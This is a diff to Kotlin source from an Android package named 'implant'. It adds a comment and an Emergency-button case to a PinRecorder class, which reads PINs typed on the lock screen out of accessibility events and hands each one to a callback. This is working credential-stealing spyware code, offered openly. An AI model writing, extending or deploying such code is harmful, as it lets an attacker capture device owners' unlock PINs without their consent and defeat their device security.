@@ -1,3 +1,8 @@
+/*
+* Records PINs entered on the lock screen.
+* Since the PIN pad widgets are regular Buttons, an AccessibilityEvent with the text is sent.
+* This class parses PINs from a stream of these AccessibilityEvents.
+* */
 package com.cooperthecoder.implant
 
 import android.view.accessibility.AccessibilityEvent
@@ -18,6 +23,7 @@ class PinRecorder(val callback: Callback) {
         val ZERO = "[0, +]"
         val DELETE = "[Delete]"
         val ENTER = "[Enter]"
+        val EMERGENCY = "[Emergency]"
     }
 
     private val queue = LinkedList<String>()
@@ -33,6 +39,10 @@ class PinRecorder(val callback: Callback) {
             PinPad.ENTER -> {
                 callback.onPinRecorded(queue.joinToString("-"))
                 queue.clear()
+            }
+
+            PinPad.EMERGENCY -> {
+                // Ignore these
             }
 
             else -> {
